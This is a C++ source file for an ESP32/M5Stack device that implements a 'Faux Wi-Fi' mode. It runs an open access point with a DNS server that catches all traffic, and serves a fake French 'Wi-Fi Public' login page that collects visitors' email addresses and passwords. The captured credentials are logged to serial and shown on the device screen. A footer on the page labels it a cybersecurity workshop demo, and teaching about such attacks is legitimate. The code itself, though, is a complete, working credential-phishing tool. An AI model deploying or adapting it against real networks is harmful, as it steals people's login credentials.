#include "modes.h"

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

#include "config.h"

namespace {

WebServer server(80);
DNSServer dnsServer;

uint8_t clientCount = 0;
String lastCaptured = "";
bool portalActive = false;

const char PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Connexion Wi-Fi</title>
  <style>
    body{font-family:sans-serif;background:#f0f0f0;margin:0;padding:20px}
    .card{max-width:360px;margin:40px auto;background:#fff;padding:24px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.15)}
    h1{font-size:18px;color:#333}
    input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box}
    button{width:100%;padding:12px;background:#007bff;color:#fff;border:0;border-radius:4px;font-size:16px}
    .warn{font-size:11px;color:#888;margin-top:16px}
  </style>
</head>
<body>
  <div class="card">
    <h1>Wi-Fi Public — Connexion requise</h1>
    <p>Entrez vos identifiants pour accéder à Internet.</p>
    <form action="/login" method="POST">
      <input name="email" type="email" placeholder="E-mail" required>
      <input name="pass" type="password" placeholder="Mot de passe" required>
      <button type="submit">Se connecter</button>
    </form>
    <p class="warn">Atelier cybersécurité — ne saisissez pas de vrais identifiants.</p>
  </div>
</body>
</html>
)rawliteral";

void handleRoot() {
    server.send(200, "text/html", PORTAL_HTML);
}

void handleLogin() {
    String email = server.arg("email");
    String pass = server.arg("pass");
    lastCaptured = email + " / " + pass;
    Serial.printf("[FAKE_WIFI] Tentative capturée: %s\n", lastCaptured.c_str());
    server.send(200, "text/html",
                "<html><body style='font-family:sans-serif;text-align:center;padding:40px'>"
                "<h2>Connexion en cours...</h2>"
                "<p>Veuillez patienter.</p></body></html>");
}

void handleNotFound() {
    server.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/", true);
    server.send(302, "text/plain", "");
}

}  // namespace

void fakeWifiInit() {
    clientCount = 0;
    lastCaptured = "";
    portalActive = false;

    WiFi.mode(WIFI_AP);
    WiFi.softAP(FAKE_AP_SSID, FAKE_AP_PASSWORD);

    dnsServer.start(53, "*", WiFi.softAPIP());
    server.on("/", HTTP_GET, handleRoot);
    server.on("/login", HTTP_POST, handleLogin);
    server.onNotFound(handleNotFound);
    server.begin();
    portalActive = true;

    Serial.printf("[FAKE_WIFI] AP actif: %s — IP %s\n",
                  FAKE_AP_SSID, WiFi.softAPIP().toString().c_str());
}

void fakeWifiDraw() {
    auto& dsp = M5.Display;
    dsp.fillScreen(TFT_BLACK);
    drawHeader("Faux Wi-Fi");

    dsp.setTextColor(TFT_YELLOW);
    dsp.setTextSize(1);
    dsp.setCursor(4, 30);
    dsp.printf("SSID: %s", FAKE_AP_SSID);

    dsp.setTextColor(TFT_WHITE);
    dsp.setCursor(4, 48);
    dsp.printf("IP: %s", WiFi.softAPIP().toString().c_str());

    dsp.setTextColor(TFT_GREEN);
    dsp.setCursor(4, 66);
    dsp.printf("Clients: %u", WiFi.softAPgetStationNum());

    dsp.setTextColor(TFT_ORANGE);
    dsp.setCursor(4, 88);
    dsp.println("Portail captif actif");

    if (lastCaptured.length() > 0) {
        dsp.setTextColor(TFT_RED);
        dsp.setCursor(4, 108);
        dsp.println("Donnees saisies:");
        dsp.setCursor(4, 120);
        String line = lastCaptured;
        if (line.length() > 28) line = line.substring(0, 25) + "...";
        dsp.println(line.c_str());
    }

    drawFooter("B: quitter");
}

void fakeWifiLoop() {
    dnsServer.processNextRequest();
    server.handleClient();

    static uint8_t lastClients = 0;
    uint8_t now = WiFi.softAPgetStationNum();
    if (now != lastClients) {
        lastClients = now;
        fakeWifiDraw();
        if (now > clientCount) {
            Serial.printf("[FAKE_WIFI] Nouveau client (%u connecte(s))\n", now);
        }
        clientCount = now;
    }

    if (lastCaptured.length() > 0) {
        static String shown = "";
        if (shown != lastCaptured) {
            shown = lastCaptured;
            fakeWifiDraw();
        }
    }
}

void fakeWifiStop() {
    server.stop();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    portalActive = false;
}
